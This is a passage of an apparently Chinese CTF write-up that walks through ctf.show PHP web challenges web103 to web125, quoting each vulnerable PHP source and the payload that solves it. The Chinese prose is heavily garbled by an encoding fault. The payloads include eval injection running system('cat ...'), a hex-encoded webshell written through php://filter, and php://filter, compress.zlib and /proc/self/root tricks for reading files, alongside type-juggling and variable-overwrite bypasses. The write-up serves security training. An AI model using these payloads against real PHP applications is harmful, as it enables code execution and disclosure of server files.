$s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 if(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){ 23 file_put_contents($v3,$str); 24 } 25 else{ 26 die(\u0026#39;Sorry\u0026#39;); 27 } 28} 29else{ 30 die(\u0026#39;hacker\u0026#39;); 31} 32 33?\u0026gt; è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸€ä¸ªè¿‡æ»¤\nif(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){\rfile_put_contents($v3,$str);\r}\relse{\rdie(\u0026#39;Sorry\u0026#39;);\r} ç»§ç»­ç”¨ä¸Šé¢˜çš„æ–¹æ³•å³å¯\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web104 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:27:20 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2)){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; ä½¿v1=v2å³å¯\nv1=1\rv2=1 web105 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:34:07 9 10*/ 11 12highlight_file(__FILE__); 13include(\u0026#39;flag.php\u0026#39;); 14error_reporting(0); 15$error=\u0026#39;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ\u0026#39;; 16$suces=\u0026#39;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼\u0026#39;; 17foreach($_GET as $key =\u0026gt; $value){ 18 if($key===\u0026#39;error\u0026#39;){ 19 die(\u0026#34;what are you doing?!\u0026#34;); 20 } 21 $$key=$$value; 22}foreach($_POST as $key =\u0026gt; $value){ 23 if($value===\u0026#39;flag\u0026#39;){ 24 die(\u0026#34;what are you doing?!\u0026#34;); 25 } 26 $$key=$$value; 27} 28if(!($_POST[\u0026#39;flag\u0026#39;]==$flag)){ 29 die($error); 30} 31echo \u0026#34;your are good\u0026#34;.$flag.\u0026#34;\\n\u0026#34;; 32die($suces); 33 34?\u0026gt; æœ¬é¢˜è€ƒæŸ¥å˜é‡è¦†ç›–å’Œdie()çš„çŸ¥è¯†\n$$a = $$bå¯ä»¥ç±»ä¼¼äºï¼Œå°†$açš„åœ°å€æŒ‡å‘$b\næ‰€ä»¥æ— è®º$bæ€ä¹ˆæ”¹å˜å€¼ï¼Œ$açš„å€¼éƒ½ä¼šå’Œ$bä¸€æ ·\ndie()å‡½æ•°è™½ç„¶ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†åŒæ—¶ä¹Ÿä¼šè¾“å‡ºæ‹¬å·å†…çš„ç»ˆæ­¢æç¤ºä¿¡æ¯\næ–¹æ³•ä¸€ï¼š\næœ¬é¢˜åˆ©ç”¨å˜é‡è¦†ç›–å’Œdie()å‡½æ•°çš„ç‰¹æ€§\nå…ˆå¯¹getçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½è¦†ç›–errorï¼Œæ‰€ä»¥è¦è¦†ç›–sucesï¼Œå³?suces=flagï¼Œæ­¤æ—¶suces=\u0026gt;flagçš„åœ°å€ å†å¯¹postçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½å°†flagç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥åªèƒ½error=sucesï¼Œæ­¤æ—¶error=\u0026gt;flagçš„åœ°å€ æ­¤æ—¶æ— è®ºè¿›å…¥å“ªä¸ªdie()å‡½æ•°ï¼Œéƒ½å¯ä»¥è¾“å‡º$flagçš„å€¼ payload:\nGet: suces=flag\rPOST: error=suces æ–¹æ³•äºŒï¼š\nGet: ?suces=flag\u0026amp;flag= å…ˆå°†flagçš„å€¼èµ‹ç»™sucesï¼Œå†å°†flagçš„å€¼èµ‹ä¸ºç©ºï¼Œä»è€Œé€šè¿‡åˆ¤æ–­ï¼Œè¾“å‡ºsucesçš„å€¼\nweb106 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:38:27 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2) \u0026amp;\u0026amp; $v1!=$v2){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; æˆ‘ä»¬ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯\nv1[]=1\rv2[]=0 web107 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:24:14 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if(isset($_POST[\u0026#39;v1\u0026#39;])){ 18 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 19 $v3 = $_GET[\u0026#39;v3\u0026#39;]; 20 parse_str($v1,$v2); 21 if($v2[\u0026#39;flag\u0026#39;]==md5($v3)){ 22 echo $flag; 23 } 24 25} 26 27 28 29?\u0026gt; parse_strå‡½æ•°:å®ƒç”¨äºå°†å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¦‚æœ str æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† arr åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚\n1\u0026lt;?php 2 //parse_str()å°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ 3 parse_str(\u0026#34;name=Gopal K Verma\u0026amp;age=45\u0026#34;); 4 5 echo $name.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 6 echo $age; 7?\u0026gt; å…¶å®å®é™…ä¸Šå°±æ˜¯md5å¼±æ¯”è¾ƒ\næ–¹æ³•ä¸€ï¼šéšä¾¿ç»™ä¸€ä¸ªå€¼ç»™flagï¼Œå°†MD5è½¬æ¢åçš„å€¼èµ‹ç»™v3\nv3=1\rv1=flag=c4ca4238a0b923820dcc509a6f75849b æ–¹æ³•äºŒ:æ•°ç»„ç»•è¿‡\nv3[]=1\rv1=\u0026#34;flag[]=1\u0026#34; web108 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:53:55 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if (ereg (\u0026#34;^[a-zA-Z]+$\u0026#34;, $_GET[\u0026#39;c\u0026#39;])===FALSE) { 18 die(\u0026#39;error\u0026#39;); 19 20} 21//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag 22if(intval(strrev($_GET[\u0026#39;c\u0026#39;]))==0x36d){ 23 echo $flag; 24} 25 26?\u0026gt; é¢˜ç›®ç»™å‡ºçš„0x36dä¸º16è¿›åˆ¶æ•°ï¼Œåè¿›åˆ¶ä¸º877ï¼Œéœ€è¦å­—æ¯å¼€å¤´æˆ–ç»“å°¾çš„è¯ä¸º877aï¼Œå› ä¸ºæ˜¯==å¼±æ¯”è¾ƒï¼Œå¯ä»¥ç­‰åŒäº877ï¼Œé€†åºåä¸ºa778,ç›´æ¥è¯»å–ä¸è¡Œï¼Œéœ€è¦åŠ ä¸€ä¸ªæˆªæ–­%00æ¥ç»•è¿‡æ­£åˆ™çš„åˆ¤æ–­ã€‚\npayload\nGET:?c=a%00778 web109 è€ƒç‚¹:phpåŸç”Ÿç±»åˆ©ç”¨\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:02:34 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v1) \u0026amp;\u0026amp; preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v2)){ 20 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 21 } 22 23} 24 25?\u0026gt; å…³äºphpåŸç”Ÿç±»çš„åˆ©ç”¨\nhttps://blog.csdn.net/weixin_54902210/article/details/124689580\npayload:\nv1=Exception\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) or\rv1=Reflectionclass\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) å…¶ä»–çš„åŸç”Ÿç±»ä¹Ÿè¡Œï¼Œæ¯”å¦‚Error\nweb110 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:49:10 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v1)){ 20 die(\u0026#34;error v1\u0026#34;); 21 } 22 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v2)){ 23 die(\u0026#34;error v2\u0026#34;); 24 } 25 26 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 27 28} 29 30?\u0026gt; ä¾æ—§æ˜¯å¯¹phpåŸç”Ÿç±»çš„åˆ©ç”¨\nä½†æ˜¯å¢åŠ äº†å¯¹v1å’Œv2çš„è¿‡æ»¤ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰è¿‡æ»¤å­—æ¯ï¼Œè€ƒè™‘ç”¨çº¯å­—æ¯æ„é€ payload\nç±»FilesystemIteratorå¯ä»¥ç”¨æ¥éå†ç›®å½•ï¼Œéœ€è¦ä¸€ä¸ªè·¯å¾„å‚æ•°\nå‡½æ•°getcwdå¯ä»¥è¿”å›å½“å‰å·¥ä½œè·¯å¾„ä¸”ä¸éœ€è¦å‚æ•°ï¼Œç”±æ­¤å¯ä»¥æ„é€ payload\nhttps://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator\u0026amp;v2=getcwd å¾—åˆ°flagçš„ä½ç½®,ç›´æ¥è®¿é—®å³å¯\nweb111 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 02:41:40 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15 16function getFlag(\u0026amp;$v1,\u0026amp;$v2){ 17 eval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;); 18 var_dump($$v1); 19} 20 21 22if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 23 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 24 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 25 26 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v1)){ 27 die(\u0026#34;error v1\u0026#34;); 28 } 29 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v2)){ 30 die(\u0026#34;error v2\u0026#34;); 31 } 32 33 if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){ 34 getFlag($v1,$v2); 35 } 36 37} 38?\u0026gt; è¿™é¢˜æ˜¯å…³äºå˜é‡è¦†ç›–çš„é¢˜ç›®\nç”±äº\nif(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){\rgetFlag($v1,$v2);\r} æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ç¡®å®šv1çš„å€¼åªèƒ½ä¸ºctfshow\næ¥ä¸‹æ¥çœ‹getFlagå‡½æ•°\nfunction getFlag(\u0026amp;$v1,\u0026amp;$v2){\reval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;);\rvar_dump($$v1);\r} getFlagå‡½æ•°ä¼šå°†v1çš„åœ°å€æŒ‡å‘v2ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šä½¿v1çš„å€¼ç­‰äºv2\nvar_dumpåˆ™ä¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯\né‚£æˆ‘ä»¬åªéœ€è¦ä½¿v2çš„å€¼ç­‰äºæˆ‘ä»¬è¦æŸ¥è¯¢çš„å˜é‡å°±å¯ä»¥è¯»åˆ°æˆ‘ä»¬çš„flag\nä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“è¦æŸ¥çš„å˜é‡æ˜¯ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯åœ¨ä½œç”¨åŸŸé‡Œé¢\næ‰€è¿™é‡Œä½¿ç”¨è¶…å…¨å±€å˜é‡ $GLOBALSï¼Œ$GLOBALS æ˜¯PHPçš„ä¸€ä¸ªè¶…çº§å…¨å±€å˜é‡ç»„ï¼ŒåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ï¼Œå˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚\næ„é€ payloadæŠŠæ‰€æœ‰å…¨å±€å˜é‡å…¨è¾“å‡ºæ¥\nhttps://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow\u0026amp;v2=GLOBALS web112 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:49 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#34;hacker!\u0026#34;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(!is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯phpä¼ªåè®®ï¼Œè™½ç„¶è¢«banäº†dataã€input ç­‰ä¼ªåè®®ï¼Œåˆbanäº† stringã€dataã€rot13 ç›¸å…³çš„è¿‡æ»¤å™¨ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸å°‘èƒ½ç”¨çš„ä¼ªåè®®å’Œè¿‡æ»¤å™¨\nå¦‚ php://filterï¼ˆè¿™é‡Œä¹Ÿç”¨ä¸åˆ°è¿‡æ»¤å™¨ï¼‰\nhttps://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php å…¶ä»–\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\rphp://filter/read=convert.quoted-printable-encode/resource=flag.php\rcompress.zlib://flag.php ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥è¾“å…¥flag.phpå‘¢?\nif(!is_file($file)){\rhighlight_file(filter($file));\r}else{\recho \u0026#34;hacker!\u0026#34;;\r} é‚£æ˜¯å› ä¸ºis_file(\u0026ldquo;flag.php\u0026rdquo;)==trueï¼Œè¾“å‡ºhackerï¼\nweb113 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:52 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(! is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} è¿™é¢˜ç›¸æ¯”ä¸Šé¢˜æŠŠfilterè¿‡æ»¤äº†\næˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å…¶ä»–ä¼ªåè®®\nå¦‚ compress.zlib://\ncompress.zlib://flag.php å®˜æ–¹é¢˜è§£ ç›®å½•æº¢å‡ºå¯¼è‡´is_fileè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶\n/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\rroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\rc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\rself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\rlf/root/proc/self/root/var/www/html/flag.php web114 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:02:53 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14function filter($file){ 15 if(preg_match(\u0026#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22echo \u0026#34;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼\u0026#34;; 23if(! is_file($file)){ 24 highlight_file(filter($file)); 25}else{ 26 echo \u0026#34;hacker!\u0026#34;; 27} è¿™é¢˜banæ‰äº†compresså’Œrootæ²¡åŠæ³•ä½¿ç”¨ä¸Šé¢˜çš„ä¸¤ç§è§£æ³•ï¼Œä½†æ˜¯æŠŠfilteræ”¾å‡ºæ¥äº†\nphp://filter/resource=flag.php ç›´æ¥è¯»å°±å®Œäº‹äº†\nweb115 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:08:19 9 10*/ 11 12include(\u0026#39;flag.php\u0026#39;); 13highlight_file(__FILE__); 14error_reporting(0); 15function filter($num){ 16 $num=str_replace(\u0026#34;0x\u0026#34;,\u0026#34;1\u0026#34;,$num); 17 $num=str_replace(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,$num); 18 $num=str_replace(\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,$num); 19 $num=str_replace(\u0026#34;e\u0026#34;,\u0026#34;1\u0026#34;,$num); 20 $num=str_replace(\u0026#34;+\u0026#34;,\u0026#34;1\u0026#34;,$num); 21 return $num; 22} 23$num=$_GET[\u0026#39;num\u0026#39;]; 24if(is_numeric($num) and $num!==\u0026#39;36\u0026#39; and trim($num)!==\u0026#39;36\u0026#39; and filter($num)==\u0026#39;36\u0026#39;){ 25 if($num==\u0026#39;36\u0026#39;){ 26 echo $flag; 27 }else{ 28 echo \u0026#34;hacker!!\u0026#34;; 29 } 30}else{ 31 echo \u0026#34;hacker!!!\u0026#34;; 32} å‚è€ƒæ–‡ç« :ctfshowå­¦ä¹ è®°å½•-webå…¥é—¨ï¼ˆphpç‰¹æ€§109-115\u0026amp;123\u0026amp;125-126ï¼‰_ctfshow web109-CSDNåšå®¢\nis_numericå¯ä»¥åœ¨æ•°å­—å‰é¢åŠ ç©ºæ ¼ç»•è¿‡ï¼ŒåŒæ—¶åŠ ä¸Šç©ºæ ¼ä¹Ÿå¯ä»¥ç»•è¿‡$num!=\u0026lsquo;36\u0026rsquo;\nä½†æ˜¯æˆ‘ä»¬çŸ¥é“trimå‡½æ•°æ˜¯ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œç©ºæ ¼ç­‰å­—ç¬¦æ˜¯ä¼šè¢«å»æ‰çš„\næˆ‘ä»¬è¿™é‡Œè€ƒè™‘ä½¿ç”¨%0cï¼ˆæ¢é¡µç¬¦ï¼‰è¿›è¡Œç»•è¿‡\nåŒæ—¶ä½¿ç”¨%0cä¹Ÿå¯ä»¥ç»•è¿‡filterã€‚\næ¥ä¸‹æ¥å†çœ‹ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè¿™æ˜¯çœ‹èµ·æ¥å¾ˆçŸ›ç›¾çš„ä¸€ä¸ªåˆ¤æ–­ã€‚\næ¥å…·ä½“çœ‹ä¸€ä¸‹!==çš„å®šä¹‰ï¼Œåªè¦ç±»å‹ä¸åŒå°±ä¸å…¨ç­‰ã€‚\nå¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œã€‚æ­¤è§„åˆ™ä¹Ÿé€‚ç”¨äº switch è¯­å¥ã€‚å½“ç”¨ === æˆ– !== è¿›è¡Œæ¯”è¾ƒæ—¶åˆ™ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå› ä¸ºæ­¤æ—¶ç±»å‹å’Œæ•°å€¼éƒ½è¦æ¯”å¯¹ã€‚ â€”â€”ã€Šphpæ‰‹å†Œã€‹è¯­è¨€å‚è€ƒ-è¿ç®—ç¬¦-æ¯”è¾ƒè¿ç®—ç¬¦\nä¹Ÿå°±æ˜¯è¯´!==æ—¶ä¸è¿›è¡Œç±»å‹è½¬æ¢ã€‚\næ‰€ä»¥åŠ ä¸Š%0cæ¢é¡µç¬¦ï¼Œåœ¨==è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€æœ‰%0c36ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼36ï¼Œç»“æœtrueï¼›åœ¨!==ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å’Œæ•°å€¼æ¯”è¾ƒï¼Œç±»å‹ä¸åŒï¼Œç»“æœtrueã€‚\npayloadï¼š\n?num=%0c36 web123 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16$a=$_SERVER[\u0026#39;argv\u0026#39;]; 17$c=$_POST[\u0026#39;fun\u0026#39;]; 18if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 19 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?/\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=18){ 20 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 21 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 22 echo $flag; 23 } 24 } 25} 26?\u0026gt; è¿™é¢˜å…¶å®æ ¹æœ¬ä¸ç”¨ç†ä¼š\nif($fl0g===\u0026#34;flag_give_me\u0026#34;){\recho $flag;\r} è¿™é¢˜å¯¹cè¿›è¡Œäº†ä¸€å®šçš„é™åˆ¶ï¼Œä½†æ˜¯å½±å“ä¸å¤§æˆ‘ä»¬å¯ä»¥ç›´æ¥å†evalå¤„æ‰§è¡Œecho $flag;ä»è€Œæ‹¿åˆ°flag\nè¿™é¢˜è¿˜æœ‰ä¸€ä¸ªè€ƒç‚¹ï¼Œç”±äºåœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢\npayload:\nPOST:CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun= echo $flag web125 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 25?\u0026gt; è¿™é¢˜æŠŠä¸Šé¢˜çš„echoæ–¹æ³•å’Œflagå…³é”®è¯banäº†\nè€ƒè™‘é€šè¿‡äºŒæ¬¡ä¼ å‚çš„æ–¹æ³•è¯»flag\næˆ‘ä¸€å¼€å§‹è€ƒè™‘äº†systemäºŒæ¬¡ä¼ 